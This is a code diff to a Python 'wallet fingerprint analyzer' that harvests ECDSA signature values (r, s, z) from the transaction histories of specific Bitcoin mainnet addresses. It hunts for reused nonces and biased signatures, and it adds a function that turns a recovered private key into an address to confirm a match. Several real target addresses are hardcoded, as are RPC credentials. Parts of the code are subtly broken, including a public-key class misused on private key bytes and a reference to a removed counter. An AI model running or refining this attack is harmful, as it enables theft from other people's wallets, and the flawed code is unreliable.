@@ -3,10 +3,13 @@ import time
 import subprocess
 import json
 import ecdsa
+from ecdsa import VerifyingKey, SECP256k1
 from bitcoinutils.transactions import Transaction
 from bitcoinutils.script import Script
 from bitcoinutils.setup import setup
 import binascii
+import hashlib
+import base58
 
 # --- WALLET FINGERPRINT ANALYZER v19.0 ---
 # Current Time: 10:44 AM CDT, Tuesday, June 9, 2026
@@ -14,6 +17,9 @@ import binascii
 
 RPC_USER = "ace"
 RPC_PASS = "browser"
+
+# 1. Initialize for Mainnet
+setup('mainnet')
 
 def analyze_wallet_fingerprint(address):
     """
@@ -296,22 +302,75 @@ def get_full_history(address):
 
     return all_txs
 
+def private_key_to_address(found_number):
+    """
+    Converts a private key hex string to a Legacy P2PKH address.
+    Handles both Uncompressed (standard in 2012) and Compressed formats.
+    """
+    # 1. Ensure the hex is exactly 64 characters (32 bytes)
+    # 1. Convert integer to hex
+    raw_hex = hex(found_number)[2:]
+    
+    # 2. Pad with leading zeros to ensure it is exactly 32 bytes (64 chars)
+    # This is critical! A 256-bit key MUST be 64 characters.
+    private_key_hex = raw_hex.zfill(64)
+
+    private_key_hex = private_key_hex.zfill(64)
+    private_key_bytes = binascii.unhexlify(private_key_hex)
+    
+    # 2. Derive Public Key using SECP256k1
+    sk = VerifyingKey.from_string(private_key_bytes, curve=SECP256k1)
+    
+    # 3. Generate BOTH Uncompressed and Compressed addresses for verification
+    formats = {
+        "Uncompressed": b'\x04' + sk.to_string(),
+        "Compressed": sk.to_string(encoding="compressed")
+    }
+    
+    results = {}
+    for fmt_name, pubkey_bytes in formats.items():
+        # Hash 160: RIPEMD160(SHA256(PubKey))
+        sha256_pk = hashlib.sha256(pubkey_bytes).digest()
+        ripemd160 = hashlib.new('ripemd160')
+        ripemd160.update(sha256_pk)
+        pubkey_hash = ripemd160.digest()
+        
+        # Add Network Byte (0x00 for Mainnet)
+        network_hash = b'\x00' + pubkey_hash
+        
+        # Checksum: First 4 bytes of Double SHA256
+        checksum = hashlib.sha256(hashlib.sha256(network_hash).digest()).digest()[:4]
+        
+        # Base58Check Encoding
+        address = base58.b58encode(network_hash + checksum).decode('utf-8')
+        results[fmt_name] = address
+        
+    return results
+
+
 def detectBias(scriptsig_hex):
-    if not scriptsig_hex: return 0
+    # if not scriptsig_hex: return 0
+    # try:
+    #     # The push-byte (e.g., 0x47, 0x48) indicates total sig length
+    #     push_byte = int(scriptsig_hex[0:2], 16)
+    #     if push_byte >= 0x48: return 0 # Standard 72+ bytes
+    #     return (0x48 - push_byte) * 8 # 8 bits per missing byte
+    # except: return 0
     try:
-        # The push-byte (e.g., 0x47, 0x48) indicates total sig length
         push_byte = int(scriptsig_hex[0:2], 16)
-        if push_byte >= 0x48: return 0 # Standard 72+ bytes
-        return (0x48 - push_byte) * 8 # 8 bits per missing byte
-    except: return 0
+        if push_byte >= 0x48:
+            return 0
+        # Formula: Each byte below 0x47 adds 8 bits, plus the initial 1-bit sign bias
+        return ((0x47 - push_byte) * 8) + 1
+    except:
+        return 0
 
 def get_z_legacy(raw_tx_hex, input_index, script_pub_key_hex):
     """
     Calculates the 'z' value (the hash to be signed) for a legacy P2PKH input.
     """
     try:
-        # 1. Initialize for Mainnet
-        setup('mainnet')
+        
         # Standard Bitcoin SIGHASH_ALL (01) logic handled by bitcoin-utils
         # This performs the 'Blank and Swap' correctly for any input index.
         tx = Transaction.from_raw(raw_tx_hex)
@@ -367,7 +426,8 @@ def extract_rsz_data(full_history, my_address):
     r_seen = {} # For instant duplicate R detection
     out_txs = set()
     maxBias = 0
-    totalCnt = 0
+    maxBiasCnt = 0
+    totalList = []
 
     for tx in full_history:
         # raw_tx_hex = requests.get(f"https://mempool.space/api/tx/{tx['txid']}/hex").text
@@ -375,13 +435,17 @@ def extract_rsz_data(full_history, my_address):
         # return
 
         for i, vin in enumerate(tx.get('vin', [])):
+            if vin.get('prevout', {}) == None or vin.get('prevout', {}) == {}:
+                continue
             if vin.get('prevout', {}).get('scriptpubkey_address') == my_address:
                 scriptsig = vin.get('scriptsig', '')
                 if not scriptsig or '30' not in scriptsig: continue
                 
                 # Precise DER Parsing
                 try:
-                    totalCnt += 1
+                    to_entity = {'tx': tx['txid'], 'script': scriptsig}
+                    if to_entity not in totalList:
+                        totalList.append(to_entity)
                     approBias = (detectBias(scriptsig))
                     if approBias == 0:
                         continue
@@ -441,7 +505,10 @@ def extract_rsz_data(full_history, my_address):
                     print("z=>  ", z)
 
                     entry = {'txid': tx['txid'], 'r': r, 's': s, 'z': z, 'pubkey': pubkey}
-                    recovered_data.append(entry)
+                    if entry not in recovered_data:
+                        recovered_data.append(entry)
+                        if maxBias > 1:
+                            maxBiasCnt += 1
 
                     # Instant Duplicate Check
                     # if r in r_seen:
@@ -457,6 +524,7 @@ def extract_rsz_data(full_history, my_address):
                         if s not in s_list:
                             print("found")
                             r_seen[r].append(s)
+                            return
                     else:
                         r_seen[r] = []
                         r_seen[r].append(s)
@@ -469,13 +537,16 @@ def extract_rsz_data(full_history, my_address):
                 except Exception as e:
                     print(f"Skip TX {tx['txid']}: Parsing error {e}")
 
-    print(maxBias)
-    return recovered_data, r_seen, totalCnt
+    print(maxBias,"  ", maxBiasCnt)
+    return recovered_data, r_seen, len(totalList)
 
 if __name__ == "__main__":
     # Example:
-    address= "1NibfhHfgA857dtG6pB25Y5hDcxpDo2J47"
-    # address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+    # address= "1NibfhHfgA857dtG6pB25Y5hDcxpDo2J47"
+    # address = "1EpbMFnnpCi6QjQCJMhkKdJyatwDjeoYmA"
+    # address = "1FgiDfz7jmdjTUaJ9GsKbNbgsmu7T31Dvx"
+    # address = "1DEfMuUGRhvoQE7cxgds3nYjRZzzhfJ9jc"
+    address = "1A8mhLMd1meWZbLvbKCzpta5rC9tnV5v5Z"
     # report = detect_vulnerable_software(address)
     # print(report)
     allHistory = get_full_history(address)
@@ -487,6 +558,7 @@ if __name__ == "__main__":
             verfiedCnt += 1
         # print(res)
     print(len(result), "-", verfiedCnt, "-", totalCnt)
+    print(len(r_du))
 
 
 # Finds any signature starting with the 71-byte push (47) or 70-byte push (46)
